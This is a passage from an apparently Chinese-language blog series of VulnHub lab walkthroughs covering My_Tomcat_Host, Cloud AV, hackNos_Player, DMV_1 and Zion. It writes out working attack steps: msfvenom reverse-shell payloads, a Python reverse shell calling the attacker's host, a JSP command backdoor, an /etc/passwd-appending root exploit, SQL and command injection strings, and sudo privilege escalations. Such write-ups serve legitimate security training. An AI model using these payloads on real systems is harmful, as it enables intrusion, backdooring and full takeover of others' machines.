<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.166</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/01.png" alt="" /></p>
<h2 id="web路径扫描"><a class="markdownIt-Anchor" href="#web路径扫描"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.166:8080/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/02.png" alt="" /></p>
<h2 id="漏洞利用-17"><a class="markdownIt-Anchor" href="#漏洞利用-17"></a> 漏洞利用</h2>
<p>用浏览器访问8080端口的页面</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/03.png" alt="" /></p>
<p>点击左侧<code>Manager App</code>按钮进行登录，使用默认账户<code>tomcat:tomcat</code>登入成功</p>
<p>上传jsp后门</p>
<p>这里用了两个jsp后门<br />
一个用于浏览文件(<a target="_blank" rel="noopener" href="https://github.com/rohitcoder/BackDoors">https://github.com/rohitcoder/BackDoors</a>)<br />
一个用于执行命令(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/swyft/articles/5563732.html">https://www.cnblogs.com/swyft/articles/5563732.html</a>)<br />
第一个后门的执行命令模块无法使用</p>
<p>保存后门，压缩zip包，改后缀为war，然后在Manager页面进行war包的部署<br />
<img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/04.png" alt="" /></p>
<p>war包的部署就相当于在网站根目录解压了war包，访问时需要war包的文件名以及包内的文件名</p>
<p>如：<br />
在压缩zip时，压缩文件的文件名为<code>new1.jsp</code>，而压缩之后的zip文件改名为<code>new2.war</code>，那么在部署之后需要访问<code>/new2/new1.jsp</code></p>
<p>在第二个后门中查看权限</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/05.png" alt="" /></p>
<p>在第一个后门中查看文件，但是没有找到nc<br />
只好用meterpreter来获取一个shell</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=3693 -f elf &gt; hello.elf</code></p>
<p>然后在第一个后门中上传到目录/tmp下</p>
<p>在MSF中运行handler</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 3693</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>上传之后是没有X权限的，这时可以在第二个后门中进行赋权<br />
但是需要注意一点：要对命令进行url编码，以防止url中的特殊符号导致命令无法执行</p>
<p>url编码的结果为<code>chmod%20%2Bx%20%2Ftmp%2Fhello.elf</code></p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/06.png" alt="" /></p>
<p>然后执行meterpreter<br />
<code>%2Ftmp%2Fhello.elf</code><br />
MSF中就接收到了shell</p>
<h2 id="权限提升-17"><a class="markdownIt-Anchor" href="#权限提升-17"></a> 权限提升</h2>
<p>在meterpreter的shell中获取一个pty，以便之后的切换账户操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>这里可以看到tomcat账户可以以任何账户的身份来执行java，而且不需要密码<br />
这很可能是提权的一个突破口</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/07.png" alt="" /></p>
<p>构造密码hash</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/08.png" alt="" /></p>
<p>构造jar包来执行修改passwd文件的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cat sudo.java</span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class sudo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder();</span><br><span class="line">	processBuilder.command(&quot;&#x2F;bin&#x2F;bash&quot;, &quot;-c&quot;, &quot;echo &#39;test:$6$q.1oPln23FUPQYds$pRZlkAKZ6tN.N4c5kUCKsCF.QW1kdbnLGLTpI3XKgidZuHzbxZzjdONAzoTHgfJHh9NU2E0pO32ICFc5zL78.&#x2F;:0:0::&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">            Process process &#x3D; processBuilder.start();</span><br><span class="line">            BufferedReader reader &#x3D;</span><br><span class="line">                    new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line &#x3D; reader.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line">            int exitCode &#x3D; process.waitFor();</span><br><span class="line">            System.out.println(&quot;\nExited with error code : &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在Kali启用HTTP服务<br />
<code>python -m 'SimpleHTTPServer' 8800 &amp;</code></p>
<p>在Shell中使用wget下载java文件<br />
<code>wget http://192.168.31.10:8800/sudo.java</code></p>
<p>执行EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac sudo.java</span><br><span class="line">sudo -u root java sudo</span><br></pre></td></tr></table></figure>
<p>成功将账户信息写入passwd文件</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/09.png" alt="" /></p>
<p>切换账户即为root权限</p>
<p><img src="/images/vulnhub_walkthrough_set/My_Tomcat_Host/img/10.png" alt="" /></p>
<hr />
<p>JSP后门脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/swyft/articles/5563732.html">jsp.backdoor</a><br />
<a target="_blank" rel="noopener" href="https://github.com/rohitcoder/BackDoors">jsp.backdoor</a><br />
<a target="_blank" rel="noopener" href="https://www.runoob.com/java/java-tutorial.html">java</a><br />
<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/3403226/how-to-run-linux-commands-in-java">jar</a></p>
</blockquote>
<hr />
<h1 id="clound-av"><a class="markdownIt-Anchor" href="#clound-av"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/">Clound AV</a></h1>
<p><code>2020/05/07 22:41:53</code></p>
<h2 id="寻找靶机ip-2"><a class="markdownIt-Anchor" href="#寻找靶机ip-2"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/00.png" alt="" /></p>
<h2 id="端口扫描-18"><a class="markdownIt-Anchor" href="#端口扫描-18"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.160</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/01.png" alt="" /></p>
<h2 id="web路径扫描-2"><a class="markdownIt-Anchor" href="#web路径扫描-2"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.160:8080/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/02.png" alt="" /></p>
<h2 id="漏洞利用-18"><a class="markdownIt-Anchor" href="#漏洞利用-18"></a> 漏洞利用</h2>
<p>访问<code>http://192.168.31.160:8080/</code>，如图</p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/03.png" alt="" /></p>
<p>使用burp改变post传递的password的值为%00<br />
出现报错页面</p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/04.png" alt="" /></p>
<p>可以看到这里存在sql语句，简单分析后可以判断存在sql注入，注意这里password字段两侧是用双引号，进行sql注入时同样需要使用双引号</p>
<p>构造语句<code>1&quot; or 1--+</code><br />
成功登入页面</p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/05.png" alt="" /></p>
<p>这里通过输入文件名来对文件进行分析，这里自然可以联想到常见的&quot;Ping tool &amp; Code Injection&quot;，显示出<code>ls -l</code>的结果也算是一种提示吧</p>
<p>本来以为这里是常见的有回显命令注入，但是这个回显实在扫描病毒的结束之后才出现，而且本人进行测试的时候扫描时间很长</p>
<p>为了判断能否执行命令，在Kali上开启HTTP服务<br />
<code>pythom -m SimpleHTTPServer 9990 &amp;</code></p>
<p>然后尝试命令注入来使用wget下载本地的文件进行测试，以此来判断是否能够进行命令注入，因为开启HTTP服务之后，本地文件被下载是会存在提示的</p>
<p><code>|wget http://192.168.31.10:9990/1</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/06.png" alt="" /></p>
<p>可以看到文件被下载，说明可以进行命令注入</p>
<p>该靶机上没有nc，不过可以通过python来反弹shell</p>
<p><code>nc -lvvp 9900</code><br />
<code>| python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.10',9900));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);&quot;</code></p>
<p>即可获取shell</p>
<h2 id="权限提升-18"><a class="markdownIt-Anchor" href="#权限提升-18"></a> 权限提升</h2>
<p>由于未知的原因，本人测试时在nc的shell中输入字符会连续出现两次，用起来有些不方便，只好转到MSF</p>
<p>生成Meterpreter后门<br />
<code>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.py</code></p>
<p>在MSF中配置相关参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload python&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>使用wget传递后门并启用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.31.10:9900&#x2F;shell.py</span><br><span class="line">python shell.py</span><br></pre></td></tr></table></figure>
<p>在Meterpreter中获取pty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>这时可以看到我们是用户scanner的身份</p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/07.png" alt="" /></p>
<p>在home目录下看到一个C的源代码及其编译的程序</p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/08.png" alt="" /></p>
<p>值得注意的是，这段代码在使用freshclam扫描文件之前，会将该用户变为root，而且该程序也具有SUID权限<br />
而该程序需要用户输入文件名，如果我们能够对文件名进行注入，使其扫描文件之后再执行一段代码，那么提权就变得简单了</p>
<p>构造反弹Shell脚本</p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/09.png" alt="" /></p>
<p>nc监听相应端口<br />
<code>nc -lvvp 9996</code></p>
<p>执行程序<br />
<code>./update_cloudav '1| python test.py'</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Clound_AV/img/10.png" alt="" /></p>
<hr />
<blockquote>
<p>/console</p>
</blockquote>
<p>在访问路径<code>/console</code>时会要求用户输入pin码，这里可以通过修改HTTP Response包中的信息来进行绕过<br />
本以为给出的python console可以用来直接执行系统命令，但好像只能用于执行js里的一些函数</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hacknos.com/boredhackerblog-cloud-av-walkthrough/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="hacknos_player"><a class="markdownIt-Anchor" href="#hacknos_player"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacknos-player-v11,459/">hackNos_Player</a></h1>
<p><code>2020/05/09 18:39:43</code></p>
<h2 id="寻找靶机ip-3"><a class="markdownIt-Anchor" href="#寻找靶机ip-3"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/00.png" alt="" /></p>
<h2 id="端口扫描-19"><a class="markdownIt-Anchor" href="#端口扫描-19"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.31.33</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/01.png" alt="" /></p>
<h2 id="web路径扫描-3"><a class="markdownIt-Anchor" href="#web路径扫描-3"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.33/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/02.png" alt="" /></p>
<h2 id="漏洞利用-19"><a class="markdownIt-Anchor" href="#漏洞利用-19"></a> 漏洞利用</h2>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/03.png" alt="" /></p>
<p>dirb发现了js代码，粗略审计之后并没有获取到有效的信息</p>
<p>在Apache默认页面发现如下提示</p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/04.png" alt="" /></p>
<p>路径<code>/g@web/</code>可访问<br />
路径<code>/mini@web/</code>不可访问</p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/05.png" alt="" /></p>
<p><code>/g@web/</code>是一个wordpress站点，使用wpscan进行信息收集</p>
<p><strong>用户枚举</strong></p>
<p><code>wpscan --url http://192.168.31.33/g@web/ -e u</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/06.png" alt="" /></p>
<p>访问<code>http://192.168.31.33/g@web/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/07.png" alt="" /></p>
<p><strong>插件枚举</strong></p>
<p><code>wpscan --url http://192.168.31.33/g@web/ -e ap</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/08.png" alt="" /></p>
<p>搜索插件相关信息<br />
这里使用searchsploit搜索该插件时缺少了一个RCE的EXP，需要在网上进行搜索</p>
<p><a target="_blank" rel="noopener" href="https://wpvulndb.com/vulnerabilities/8949">https://wpvulndb.com/vulnerabilities/8949</a></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/09.png" alt="" /></p>
<p>使用该EXP直接获取shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot; action&#x3D;&quot;http:&#x2F;&#x2F;192.168.31.33&#x2F;g@web&#x2F;wp-admin&#x2F;admin-ajax.php&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;action&quot; value&#x3D;&quot;wpsp_upload_attachment&quot;&gt;</span><br><span class="line">    Choose a file ending with .phtml:</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;0&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<p><code>weevely generate pass shell.phtml</code></p>
<p>上传后在<code>http://192.168.31.33/g@web/wp-content/uploads/</code>找到上传的后门，再使用weevely连接即可获取shell</p>
<h2 id="权限提升-19"><a class="markdownIt-Anchor" href="#权限提升-19"></a> 权限提升</h2>
<p>利用当前webshell获取一个MSF的Shell，方便之后进行账户之间的切换</p>
<p>构造后门程序<br />
<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9905 -f raw &gt; pass.php</code></p>
<p>MSFConsole中进行相应配置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use explot&#x2F;multi&#x2F;handler</span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.33</span><br><span class="line">set LPORT 9905</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>触发MSF后门<br />
<code>curl http://192.168.31.33/g@web/wp-content/uploads/wpsp/pass.php</code></p>
<p>获取shell之后再获取pty</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>根据之前找到的JSON的内容，可以使用<code>hackNos@9012!!</code>来提升我们的权限</p>
<p>查看目录<code>/home</code>的文件夹</p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/10.png" alt="" /></p>
<p>尝试之后转换到用户security的身份</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su security</span><br><span class="line">hackNos@9012!!</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/11.png" alt="" /></p>
<p>查看sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/12.png" alt="" /></p>
<p>这里可以使用find命令来进行水平提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &#x2F;tmp&#x2F;1</span><br><span class="line">sudo -u hackNos-boat find &#x2F;tmp&#x2F;1 -exec &#x2F;bin&#x2F;bash \;</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/13.png" alt="" /></p>
<p>查看sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/14.png" alt="" /></p>
<p>然后再使用ruby进行提权</p>
<p><code>sudo -u hunter /usr/bin/ruby -e 'exec &quot;/bin/bash&quot;'</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/15.png" alt="" /></p>
<p>查看sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/16.png" alt="" /></p>
<p>使用gcc进行提权</p>
<p><code>sudo -u root gcc -wrapper /bin/bash,-s .</code></p>
<p><img src="/images/vulnhub_walkthrough_set/hackNos_Player/img/17.png" alt="" /></p>
<p>即可获取root权限</p>
<hr />
<blockquote>
<p>gcc -wrapper</p>
</blockquote>
<p>最后的gcc提权一开始以为是使用system函数来进行执行命令从而进行提权，但是随后发现这个操作需要SUID权限，最后看WP才发现是使用wrapper参数来执行命令</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://gcc.gnu.org/onlinedocs/gcc/Overall-Options.html#Overall-Options">wrapper</a><br />
<a target="_blank" rel="noopener" href="https://medium.com/@DamaneDz/vulnhub-hacknos-player-writeup-walkthrough-b91074a0adc4">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="dmv_1"><a class="markdownIt-Anchor" href="#dmv_1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dmv-1,462/">DMV_1</a></h1>
<p><code>2020/05/14 15:07:33</code></p>
<h2 id="寻找靶机ip-4"><a class="markdownIt-Anchor" href="#寻找靶机ip-4"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.31.0/24 | grep -B3 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/00.png" alt="" /></p>
<h2 id="端口扫描-20"><a class="markdownIt-Anchor" href="#端口扫描-20"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -n -v 192.168.31.36</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/01.png" alt="" /></p>
<h2 id="web路径扫描-4"><a class="markdownIt-Anchor" href="#web路径扫描-4"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.31.36/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/02.png" alt="" /></p>
<h2 id="漏洞利用-20"><a class="markdownIt-Anchor" href="#漏洞利用-20"></a> 漏洞利用</h2>
<p><img src="/images/vulnhub_walkthrough_set/DMV_1/img/03.png" alt="" /></p>
<p>Web服务的主页是一个Youtube视频在线转换工具，观察发送的请求包，post数据为URL</p>
<p>本地开启HTTP服务，并尝试修改URL<br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/04.png" alt="" /><br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/05.png" alt="" /><br />
猜测可能存在命令注入</p>
<p>验证存在命令注入漏洞<br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/06.png" alt="" /></p>
<p>使用MSFVenom构造Meterpreter后门<br />
<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=9995 -f raw &gt; shell.php</code></p>
<p>在MSFConsole中配置相关参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 9995</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
<p>通过命令注入来使用wget下载Meterpreter后门<br />
<code>;wget$&#123;IFS&#125;http://192.168.31.10:9900/shell.php;</code></p>
<p>触发后门<br />
<code>curl http://192.168.31.36/shell.php &amp;</code></p>
<h2 id="权限提升-20"><a class="markdownIt-Anchor" href="#权限提升-20"></a> 权限提升</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
<p>这里需要使用PSPY来检测后台的root进程<br />
PSPY: <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases">https://github.com/DominicBreuker/pspy/releases</a></p>
<p>这里可以看到root在运行<code>/var/www/html/tmp/clean.sh</code><br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/07.png" alt="" /></p>
<p>而且该sh脚本可写<br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/08.png" alt="" /></p>
<p>那么可以利用root身份执行命令</p>
<p>给find命令添加SUID权限<br />
<code>echo 'chmod u+s /usr/bin/find' &gt;&gt; clean.sh</code><br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/09.png" alt="" /></p>
<p>find命令已经获得SUID权限<br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/10.png" alt="" /></p>
<p>使用find命令获取root权限<br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/11.png" alt="" /><br />
这里可以看到<code>euid=0</code></p>
<p>查看flag<br />
<img src="/images/vulnhub_walkthrough_set/DMV_1/img/12.png" alt="" /></p>
<hr />
<blockquote>
<p>find -&gt; bash</p>
</blockquote>
<p>之前使用find进行SUID进行提权时，执行id可以看到<code>euid=0</code>，但是获取bash时却还是原来的权限，这里使用<code>bash -p</code>则可以保留euid</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="zion"><a class="markdownIt-Anchor" href="#zion"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/zion-11,476/">Zion</a></h1>
<p><code>2020/05/21 13:09:10</code></p>
<h2 id="寻找靶机ip-5"><a class="markdownIt-Anchor" href="#寻找靶机ip-5"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/00.png" alt="" /></p>
<h2 id="端口扫描-21"><a class="markdownIt-Anchor" href="#端口扫描-21"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -A -T5 -v -n 192.168.1.5</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/01.png" alt="" /></p>
<h2 id="web路径扫描-5"><a class="markdownIt-Anchor" href="#web路径扫描-5"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.1.5/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/02.png" alt="" /></p>
<h2 id="漏洞利用-21"><a class="markdownIt-Anchor" href="#漏洞利用-21"></a> 漏洞利用</h2>
<p>访问Web页面</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/03.png" alt="" /></p>
<p>点击Truth</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/04.png" alt="" /></p>
<p>可以看到HTTP Header中存在一些Base编码过的信息</p>
<p>点击Illusion</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/05.png" alt="" /></p>
<p>直接Get请求<code>/zion/login.php</code><br />
<img src="/images/vulnhub_walkthrough_set/Zion/img/06.png" alt="" /></p>
<p>对这些信息进行Base64解码</p>
<p><strong>Truth</strong><br />
<img src="/images/vulnhub_walkthrough_set/Zion/img/07.png" alt="" /></p>
<p>这里提示第二段编码中没有’+’, ‘-’, ‘/’, ‘=’<br />
所以是Base62编码</p>
<p>对第二段编码进行Base62解码<br />
<img src="/images/vulnhub_walkthrough_set/Zion/img/08.png" alt="" /><br />
<a target="_blank" rel="noopener" href="http://decode-base62.nichabi.com/">http://decode-base62.nichabi.com/</a></p>
<p>这里提示用户名和密码信息存在于选择页面</p>
<p><strong>Illusion</strong></p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/09.png" alt="" /></p>
<p>信息无效</p>
<p><strong>Get Request</strong></p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/10.png" alt="" /></p>
<p>信息无效</p>
<p>使用cewl进行字典生成<br />
<code>cewl http://192.168.1.5/ &gt; dic1</code></p>
<p>转换为小写<br />
<code>cat dic1 | tr A-Z a-z &gt; dic2</code></p>
<p>使用Burp进行账户爆破</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/11.png" alt="" /></p>
<p>得到账户<code>morpheus.thematrix:interpreted</code></p>
<p>登陆之后点击上方的Private Key</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/12.png" alt="" /></p>
<p>注意txt文本的文件名为<br />
<code>rsa_priv_key_for_w.rabbit.txt</code></p>
<p>这里保存本地之后再加上Pri_Key文件的头部与尾部</p>
<p><img src="/images/vulnhub_walkthrough_set/Zion/img/13.png" alt="" /></p>
<p>SSH登入目标服务器<br />
<code>ssh -i pri.key w.rabbit@192.168.1.5</code></p>
